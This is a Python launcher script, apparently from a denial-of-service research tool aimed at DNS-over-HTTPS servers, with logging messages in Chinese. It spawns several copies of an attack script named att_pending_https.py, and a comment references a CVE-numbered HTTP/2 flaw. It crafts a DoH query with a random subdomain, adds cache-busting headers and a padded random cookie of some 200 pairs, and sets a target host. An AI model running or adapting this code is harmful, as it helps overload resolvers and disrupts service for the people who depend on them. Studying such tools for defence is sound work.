import base64
import os
import argparse
import random
import string
import time

import dns

from logger_DoE import *

def ge_cookie():
    cookie = ""
    for i in range(200):
        cookie += ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(4, 10)))+\
                  "="''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(8, 20)))+"; "
    cookie = cookie[:-2]
    #print(sys.getsizeof(cookie)/1024)
    return cookie

parser = argparse.ArgumentParser()
parser.add_argument('-n', '--n', default=3)
parser.add_argument('-round', '--round', default=5)
parser.add_argument('-wait', '--wait', default=150)
args = parser.parse_args()
stime = time.perf_counter()
round = int(args.round)
wait_time = int(args.wait)
#print(f"python att_pending_https.py -stime {stime} -round {round} -wait {wait_time}")
logger = InfoLogger(interval=1)
logger.log_info(LogLevel.INFO, "程序开始运行")
for i in range(int(args.n)):
    #print(f"python3 cve44487.py -s {i}")
    os.popen(f"python att_pending_https.py -stime {stime} -round {round} -wait {wait_time}")

message = dns.message.make_query(''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))+ ".google.com", "A")
message.flags |= dns.flags.RD
dns_req = base64.b64encode(message.to_wire()).decode("UTF8").rstrip("=")
cookie = ge_cookie()
headers = {'host': 'www.doeresearch.site',"content-type": "application/dns-message",
           "accept": "application/dns-message",
           "Surrogate-Control": "max-age=0", "Cache-Control": "max-age=0",
           "Cookie":cookie}
logger.log_info(LogLevel.PAYLOAD, f"处理的有效负载信息：GET /dns-query?dns=" + f"{dns_req} HTTP/1.1\r\n")
logger.log_info(LogLevel.PAYLOAD, f"处理的有效负载信息：{headers}")
while True:
    current_time = time.perf_counter()
    elapsed_time = current_time - stime
    # print(f"经过的时间：{elapsed_time:.2f}秒", end="\r")
    # time.sleep(1)  # 暂停一秒钟
    if elapsed_time>wait_time:
        logger.log_info(LogLevel.INFO, "程序结束运行")
        logger.close()  # 关闭日志记录
        break